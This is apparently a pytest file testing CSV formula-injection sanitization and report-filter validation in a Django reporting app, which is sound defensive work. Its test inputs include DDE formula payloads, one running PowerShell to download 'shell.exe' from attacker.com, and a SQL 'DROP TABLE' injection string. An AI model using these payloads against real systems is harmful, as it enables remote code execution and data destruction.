"""
Phase 15: CSV Formula Injection Protection Tests

Tests CSV sanitization to prevent formula injection attacks.

References:
- OWASP CSV Injection: https://owasp.org/www-community/attacks/CSV_Injection
- CWE-1236: Improper Neutralization of Formula Elements in a CSV File
"""
import pytest
from apps.reports.services import sanitize_csv_value, export_rows_csv
from apps.organizations.models import Branch, Organization


class TestCSVFormulaSanitization:
    """Test CSV formula injection protection."""
    
    def test_sanitize_equals_prefix(self):
        """Test that values starting with = are sanitized."""
        dangerous = "=1+1"
        sanitized = sanitize_csv_value(dangerous)
        
        assert sanitized == "'=1+1", "Should prepend single quote to = prefix"
        assert not sanitized.startswith('='), "Sanitized value should not start with ="
    
    def test_sanitize_plus_prefix(self):
        """Test that values starting with + are sanitized."""
        dangerous = "+1234"
        sanitized = sanitize_csv_value(dangerous)
        
        assert sanitized == "'+1234", "Should prepend single quote to + prefix"
    
    def test_sanitize_minus_prefix(self):
        """Test that values starting with - are sanitized."""
        dangerous = "-SUM(A1:A10)"
        sanitized = sanitize_csv_value(dangerous)
        
        assert sanitized == "'-SUM(A1:A10)", "Should prepend single quote to - prefix"
    
    def test_sanitize_at_prefix(self):
        """Test that values starting with @ are sanitized."""
        dangerous = "@SUM(A1:A10)"
        sanitized = sanitize_csv_value(dangerous)
        
        assert sanitized == "'@SUM(A1:A10)", "Should prepend single quote to @ prefix"
    
    def test_sanitize_tab_prefix(self):
        """Test that values starting with tab are sanitized."""
        dangerous = "\t1+1"
        sanitized = sanitize_csv_value(dangerous)
        
        assert sanitized.startswith("'"), "Should prepend single quote to tab prefix"
    
    def test_sanitize_newline_prefix(self):
        """Test that values starting with newline are sanitized."""
        dangerous = "\n1+1"
        sanitized = sanitize_csv_value(dangerous)
        
        assert sanitized.startswith("'"), "Should prepend single quote to newline prefix"
    
    def test_sanitize_carriage_return_prefix(self):
        """Test that values starting with carriage return are sanitized."""
        dangerous = "\r1+1"
        sanitized = sanitize_csv_value(dangerous)
        
        assert sanitized.startswith("'"), "Should prepend single quote to CR prefix"
    
    def test_safe_values_unchanged(self):
        """Test that safe values are not modified."""
        safe_values = [
            "Normal text",
            "123",
            "user@example.com",
            "Product Name",
            "",
            "Safe-value",
            "Value with spaces"
        ]
        
        for value in safe_values:
            sanitized = sanitize_csv_value(value)
            assert sanitized == value, f"Safe value '{value}' should not be modified"
    
    def test_none_value(self):
        """Test that None is converted to empty string."""
        sanitized = sanitize_csv_value(None)
        assert sanitized == "", "None should become empty string"
    
    def test_numeric_types(self):
        """Test that numeric types are converted properly."""
        assert sanitize_csv_value(123) == "123"
        assert sanitize_csv_value(45.67) == "45.67"
    
    def test_formula_in_middle_not_sanitized(self):
        """Test that formulas in middle of text are not sanitized (only prefix)."""
        value = "Total =SUM(A1:A10)"
        sanitized = sanitize_csv_value(value)
        
        # Should not be modified (= is not at start)
        assert sanitized == value, "Formula in middle should not trigger sanitization"
    
    def test_cmd_injection_payloads(self):
        """Test real-world CSV injection payloads are sanitized."""
        payloads = [
            "=cmd|'/c calc'!A1",
            "=1+1+cmd|'/c powershell IEX(wget attacker.com/shell.exe)'!A1",
            "@SUM(1+1)*cmd|'/c calc'!A1",
            "+1+1+cmd|'/c calc'!A1",
            "-1+1+cmd|'/c calc'!A1"
        ]
        
        for payload in payloads:
            sanitized = sanitize_csv_value(payload)
            assert sanitized.startswith("'"), f"Payload '{payload}' should be sanitized"
            assert not any(sanitized.startswith(c) for c in ['=', '+', '-', '@']), \
                f"Sanitized payload should not start with dangerous character"


class TestCSVExportSecurity:
    """Test that CSV export applies sanitization to all rows."""
    
    def test_export_sanitizes_all_cells(self):
        """Test that export_rows_csv sanitizes all cells."""
        rows = [
            {"name": "Alice", "email": "alice@test.com", "formula": "=1+1"},
            {"name": "Bob", "email": "bob@test.com", "formula": "+SUM(A1:A10)"},
            {"name": "Charlie", "email": "charlie@test.com", "formula": "@cmd"}
        ]
        
        csv_bytes = export_rows_csv(rows)
        csv_text = csv_bytes.decode('utf-8')
        
        # Check that dangerous formulas are sanitized in output
        assert "'=1+1" in csv_text, "Should sanitize = formula"
        assert "'+SUM" in csv_text or "SUM" not in csv_text, "Should sanitize + formula"
        assert "'@cmd" in csv_text, "Should sanitize @ formula"
        
        # Check that formulas don't appear unsanitized
        assert "\n=1+1" not in csv_text, "Unsanitized = formula should not appear"
        assert "\n+SUM" not in csv_text, "Unsanitized + formula should not appear"
        assert "\n@cmd" not in csv_text, "Unsanitized @ formula should not appear"
    
    def test_export_preserves_safe_data(self):
        """Test that safe data is not corrupted by sanitization."""
        rows = [
            {"name": "Alice Anderson", "amount": "100.00", "email": "alice@test.com"},
            {"name": "Bob Brown", "amount": "200.00", "email": "bob@test.com"}
        ]
        
        csv_bytes = export_rows_csv(rows)
        csv_text = csv_bytes.decode('utf-8')
        
        # Check that normal data appears correctly
        assert "Alice Anderson" in csv_text
        assert "100.00" in csv_text
        assert "alice@test.com" in csv_text
        assert "Bob Brown" in csv_text
    
    def test_export_empty_rows(self):
        """Test that export handles empty rows gracefully."""
        rows = []
        csv_bytes = export_rows_csv(rows)
        
        # Should produce valid (empty) CSV
        assert isinstance(csv_bytes, bytes)
        assert len(csv_bytes) == 0 or csv_bytes == b""
    
    def test_export_with_none_values(self):
        """Test that None values are handled correctly."""
        rows = [
            {"name": "Alice", "middle": None, "email": "alice@test.com"}
        ]
        
        csv_bytes = export_rows_csv(rows)
        csv_text = csv_bytes.decode('utf-8')
        
        # Should contain name and email, middle should be empty string
        assert "Alice" in csv_text
        assert "alice@test.com" in csv_text


@pytest.mark.django_db
class TestReportFilterValidation:
    """Test report filter security validation."""
    
    def test_invalid_filter_keys_rejected(self, client):
        """Test that unauthorized filter keys are rejected."""
        from django.contrib.auth import get_user_model
        from apps.organizations.models import Branch, Organization
        from common.constants.roles import Roles
        
        _org_1 = Organization.objects.create(name="Test Branch Org", slug="test-ccd16ef6")
        
        branch = Branch.objects.create(name="Test Branch", organization=_org_1)
        user = get_user_model().objects.create_user(
            email="admin@test.com",
            password="test123",
            role=Roles.SUPER_ADMIN,
            branch=branch
        )
        
        client.force_login(user)
        
        # Try to create report with invalid filter
        response = client.post(
            '/api/reports/jobs/',
            data={
                'report_type': 'MEMBERSHIP',
                'export_format': 'CSV',
                'filters': {
                    'membership_status': 'ACTIVE',
                    'invalid_key': 'malicious_value'  # Not allowed for MEMBERSHIP
                }
            },
            content_type='application/json'
        )
        
        # Should be rejected
        assert response.status_code == 400
        assert 'invalid_key' in str(response.data).lower() or 'filters' in str(response.data).lower()
    
    def test_sql_injection_patterns_rejected(self, client):
        """Test that SQL injection patterns in filters are rejected."""
        from django.contrib.auth import get_user_model
        from apps.organizations.models import Branch
        from common.constants.roles import Roles
        
        _org_2 = Organization.objects.create(name="Test Branch Org", slug="test-574301f0")
        
        branch = Branch.objects.create(name="Test Branch", organization=_org_2)
        user = get_user_model().objects.create_user(
            email="admin@test.com",
            password="test123",
            role=Roles.SUPER_ADMIN,
            branch=branch
        )
        
        client.force_login(user)
        
        # Try SQL injection in filter value
        response = client.post(
            '/api/reports/jobs/',
            data={
                'report_type': 'MEMBERSHIP',
                'export_format': 'CSV',
                'filters': {
                    'membership_status': "ACTIVE'; DROP TABLE members; --"
                }
            },
            content_type='application/json'
        )
        
        # Should be rejected
        assert response.status_code == 400
        assert 'DROP' in str(response.data) or 'forbidden' in str(response.data).lower()
